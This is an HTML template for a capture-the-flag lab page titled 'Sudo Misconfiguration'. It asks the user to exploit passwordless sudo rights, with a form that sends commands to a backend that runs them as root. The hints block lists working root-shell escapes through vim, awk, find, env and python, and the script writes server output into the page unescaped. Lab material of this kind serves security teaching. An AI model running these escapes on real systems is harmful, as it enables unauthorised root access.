<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1><i class="fas fa-user-cog"></i> Sudo Misconfiguration</h1><div class="lab-info"><span class="lab-tag difficulty-easy">Easy</span></div></div>
    <div class="lab-section"><h2><i class="fas fa-crosshairs"></i> Objective</h2><p>Exploit misconfigured sudo permissions. Your user can run certain commands as root without a password. Find the right command to get a root shell or read the flag file.</p></div>
    <div class="lab-section"><h2><i class="fas fa-terminal"></i> Sudo Permissions</h2>
      <div class="code-block">
        <h4>sudo -l output:</h4>
        <pre><% if (systemInfo && systemInfo.sudoConfig) { systemInfo.sudoConfig.forEach(function(entry) { %>
<%= entry %>
<% }); } %></pre>
      </div>
      <div class="vulnerable-form" style="margin-top:1rem;">
        <div style="margin-bottom:1rem;">
          <label for="sudoCmd">Command (will be prefixed with sudo):</label>
          <input type="text" id="sudoCmd" placeholder="vim -c ':!/bin/sh'" value="">
        </div>
        <button class="btn" onclick="runSudo()"><i class="fas fa-play"></i> Run with Sudo</button>
      </div>
      <div id="sudoResults" class="result-box" style="margin-top:1rem;"></div>
      <div class="code-block">
        <h4><i class="fas fa-lightbulb"></i> Hints</h4>
        <pre>
# Common sudo privesc:
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find / -exec /bin/sh \;
sudo env /bin/sh
sudo /usr/bin/python3 -c 'import os;os.system("/bin/sh")'

# Read restricted files:
sudo cat /root/flag.txt
        </pre>
      </div>
    </div>
    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('privesc-sudo','flagInput_sudo','flagResult_sudo'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_sudo" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
      <div id="flagResult_sudo" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
  <script>
    async function runSudo() {
      const command = document.getElementById('sudoCmd').value;
      const resultsDiv = document.getElementById('sudoResults');
      resultsDiv.innerHTML = '<p style="color:var(--primary)"><i class="fas fa-spinner fa-spin"></i> Running sudo ' + command + '...</p>';
      try {
        const res = await fetch('/api/labs/privesc/sudo', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ command }) });
        const data = await res.json();
        resultsDiv.innerHTML = '<pre style="color:var(--text);white-space:pre-wrap;">' + (data.output || data.error || 'No output') + '</pre>';
      } catch(e) { resultsDiv.innerHTML = '<p style="color:#ff4444">Error: ' + e.message + '</p>'; }
    }
  </script>
</body>
</html>
